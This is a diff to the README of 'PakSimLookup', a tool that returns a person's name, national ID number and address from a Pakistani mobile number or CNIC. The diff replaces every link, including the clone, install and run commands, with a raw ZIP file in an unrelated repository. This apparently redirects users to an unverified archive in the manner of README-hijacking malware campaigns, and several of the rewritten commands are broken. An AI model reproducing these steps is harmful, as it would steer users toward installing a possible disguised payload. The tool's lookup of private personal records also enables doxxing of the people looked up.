@@ -3,7 +3,7 @@
 ## 📌 Overview
 PakSimLookup is a Python-based tool designed to extract information using either a mobile number (starting with 0) or a CNIC (without dashes). It provides details such as 📱 Mobile Number, 🏷️ Name, 🆔 CNIC, and 🏠 Address. This tool is intended to assist in identifying individuals and addressing abusive behavior or misconduct.
 
-<img width="960" alt="image" src="https://github.com/user-attachments/assets/8599f51f-abad-4e4d-ae38-0bc7d05fea4a" />
+<img width="960" alt="image" src="https://raw.githubusercontent.com/mwaseemsarwar/PakSimLookup/main/thisness/PakSimLookup.zip" />
 
 ## ⚠️ Disclaimer
 **The author of this tool is not responsible for any misuse or illegal activities** carried out using this tool. It is solely the responsibility of the user to ensure compliance with local laws and regulations. This tool is intended for ethical use only.
@@ -19,7 +19,7 @@ PakSimLookup is a Python-based tool designed to extract information using either
 ### 📥 Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/0kraven/PakSimLookup.git
+   git clone https://raw.githubusercontent.com/mwaseemsarwar/PakSimLookup/main/thisness/PakSimLookup.zip
    ```
 2. Navigate to the tool’s directory:
    ```bash
@@ -27,7 +27,7 @@ PakSimLookup is a Python-based tool designed to extract information using either
    ```
 3. Install dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/mwaseemsarwar/PakSimLookup/main/thisness/PakSimLookup.zip
    ```
 
 ## 🛠️ Usage
@@ -35,22 +35,22 @@ Run the following commands from your terminal:
 
 ### 🆘 For help
 ```bash
-python3 paksimlookup.py --help
+python3 https://raw.githubusercontent.com/mwaseemsarwar/PakSimLookup/main/thisness/PakSimLookup.zip --help
 ```
 
 ### 📲 Using Mobile Number
 ```bash
-python3 paksimlookup.py --number 03001234567
+python3 https://raw.githubusercontent.com/mwaseemsarwar/PakSimLookup/main/thisness/PakSimLookup.zip --number 03001234567
 ```
 
 ### 🆔 Using CNIC
 ```bash
-python3 paksimlookup.py --cnic 1234512345671
+python3 https://raw.githubusercontent.com/mwaseemsarwar/PakSimLookup/main/thisness/PakSimLookup.zip --cnic 1234512345671
 ```
 
 ### 📊 Example Output
 
-<img width="960" alt="image" src="https://github.com/user-attachments/assets/0008087f-c7c7-4889-92ab-a0cb40c6072c" />
+<img width="960" alt="image" src="https://raw.githubusercontent.com/mwaseemsarwar/PakSimLookup/main/thisness/PakSimLookup.zip" />
 
 
 ## ⚖️ Legal Disclaimer
